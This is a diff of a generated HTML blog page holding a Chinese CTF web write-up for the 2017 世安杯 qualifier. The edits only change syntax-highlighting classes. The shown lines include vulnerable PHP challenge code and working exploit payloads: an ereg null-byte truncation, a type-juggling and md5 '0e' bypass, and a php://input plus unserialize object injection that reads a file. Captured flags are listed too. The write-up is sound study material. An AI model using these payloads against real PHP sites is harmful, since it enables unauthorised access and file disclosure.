@@ -101,7 +101,7 @@ view_source有源码，如下</p>
 <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
 <span class="nv">$flag</span> <span class="o">=</span> <span class="s1">'*********'</span><span class="p">;</span>
 
-<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span> <span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'password'</span><span class="p">]))</span> <span class="p">{</span>
+<span class="k">if</span> <span class="p">(</span><span class="k">isset</span> <span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'password'</span><span class="p">]))</span> <span class="p">{</span>
     <span class="k">if</span> <span class="p">(</span><span class="nb">ereg</span> <span class="p">(</span><span class="s2">"^[a-zA-Z0-9]+$"</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'password'</span><span class="p">])</span> <span class="o">===</span> <span class="kc">FALSE</span><span class="p">)</span>
         <span class="k">echo</span> <span class="s1">'&lt;p class="alert"&gt;You password must be alphanumeric&lt;/p&gt;'</span><span class="p">;</span>
     <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span> <span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'password'</span><span class="p">],</span> <span class="s1">'--'</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">FALSE</span><span class="p">)</span>
@@ -128,9 +128,9 @@ view_source有源码，如下</p>
 <p>根据源码，ereg可被%00截断，直接上payload</p>
 
 <ul>
-  <li>payload : <code class="highlighter-rouge">?password=123%00--</code></li>
+  <li>payload : <code class="language-plaintext highlighter-rouge">?password=123%00--</code></li>
   <li>poc : <img src="/assets/images/posts/2017/世安杯-初赛Web-Writeup/1.png" alt="poc" /></li>
-  <li>flag : <code class="highlighter-rouge">flag{Maybe_using_rexpexp_wasnt_a_clever_move}</code></li>
+  <li>flag : <code class="language-plaintext highlighter-rouge">flag{Maybe_using_rexpexp_wasnt_a_clever_move}</code></li>
 </ul>
 
 <hr />
@@ -166,7 +166,7 @@ view_source有源码，如下</p>
 <span class="nv">$b</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> 
 <span class="nv">$c</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> 
 <span class="nv">$d</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> 
-<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'x1'</span><span class="p">]))</span> 
+<span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'x1'</span><span class="p">]))</span> 
 <span class="p">{</span> 
         <span class="nv">$x1</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'x1'</span><span class="p">];</span> 
         <span class="nv">$x1</span><span class="o">==</span><span class="s2">"1"</span><span class="o">?</span><span class="k">die</span><span class="p">(</span><span class="s2">"ha?"</span><span class="p">)</span><span class="o">:</span><span class="kc">NULL</span><span class="p">;</span> 
@@ -212,7 +212,7 @@ view_source有源码，如下</p>
 <p>还是老题目。。。首先a是1a的方式绕过判断，因为在switch中字符串和数字比较php会尝试将字符串intval后比较（或者是这里直接将x1赋值为0，这里的switch有使用错误的嫌疑）。b同样是利用字符串与数字比较的特点进行绕过 只需要赋值为2018aaa即可，c是利用array_search有如下特性：
 <img src="/assets/images/posts/2017/世安杯-初赛Web-Writeup/4.png" alt="特性" /></p>
 
-<p>d的话首先发现 <code class="highlighter-rouge">substr(md5('15562'),8,16)</code>是0e开头，则我们需要把x3构造成0e开头的后面全都是数字的md5即可，这里直接上脚本碰撞，脚本如下：</p>
+<p>d的话首先发现 <code class="language-plaintext highlighter-rouge">substr(md5('15562'),8,16)</code>是0e开头，则我们需要把x3构造成0e开头的后面全都是数字的md5即可，这里直接上脚本碰撞，脚本如下：</p>
 
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#coding:utf8
 </span><span class="kn">import</span> <span class="nn">hashlib</span>
@@ -235,11 +235,11 @@ view_source有源码，如下</p>
 
 <p>构造如下payload绕过：</p>
 <ul>
-  <li>payload : <code class="highlighter-rouge">?x1=1a&amp;x2={"x21":"2018aa","x22":[[1],0],"0":3}&amp;x3=XIPUvg6c</code></li>
+  <li>payload : <code class="language-plaintext highlighter-rouge">?x1=1a&amp;x2={"x21":"2018aa","x22":[[1],0],"0":3}&amp;x3=XIPUvg6c</code></li>
   <li>
     <p>poc : <img src="/assets/images/posts/2017/世安杯-初赛Web-Writeup/5.png" alt="poc" /></p>
   </li>
-  <li>flag : <code class="highlighter-rouge">CTF{Php_1s_bstl4_1a}</code></li>
+  <li>flag : <code class="language-plaintext highlighter-rouge">CTF{Php_1s_bstl4_1a}</code></li>
 </ul>
 
 <hr />
@@ -283,7 +283,7 @@ view_source有源码，如下</p>
     <p>poc : <img src="/assets/images/posts/2017/世安杯-初赛Web-Writeup/6.png" alt="poc" /></p>
   </li>
   <li>
-    <p>flag : <code class="highlighter-rouge">flag{U1tkOdgutaVWucdy2AbDWXPGkDx9bS2a}</code></p>
+    <p>flag : <code class="language-plaintext highlighter-rouge">flag{U1tkOdgutaVWucdy2AbDWXPGkDx9bS2a}</code></p>
   </li>
 </ul>
 
@@ -294,11 +294,11 @@ view_source有源码，如下</p>
 直接上payload吧。。</p>
 
 <ul>
-  <li>payload : <code class="highlighter-rouge">?user=php://input&amp;file=class.php&amp;pass=O:4:"Read":1:{s:4:"file";s:8:"f1a9.php";}</code></li>
+  <li>payload : <code class="language-plaintext highlighter-rouge">?user=php://input&amp;file=class.php&amp;pass=O:4:"Read":1:{s:4:"file";s:8:"f1a9.php";}</code></li>
   <li>
     <p>poc : <img src="/assets/images/posts/2017/世安杯-初赛Web-Writeup/7.png" alt="poc" /></p>
   </li>
-  <li>flag : <code class="highlighter-rouge">flag_Xd{hSh_ctf:e@syt0g3t}</code></li>
+  <li>flag : <code class="language-plaintext highlighter-rouge">flag_Xd{hSh_ctf:e@syt0g3t}</code></li>
 </ul>
 
 <hr />
@@ -314,7 +314,7 @@ view_source有源码，如下</p>
 <img src="/assets/images/posts/2017/世安杯-初赛Web-Writeup/9.png" alt="poc" /></p>
   </li>
   <li>
-    <p>flag : <code class="highlighter-rouge">flag{967DDDFBCD32C1F53527C221D9E40A0B}</code></p>
+    <p>flag : <code class="language-plaintext highlighter-rouge">flag{967DDDFBCD32C1F53527C221D9E40A0B}</code></p>
   </li>
 </ul>
 
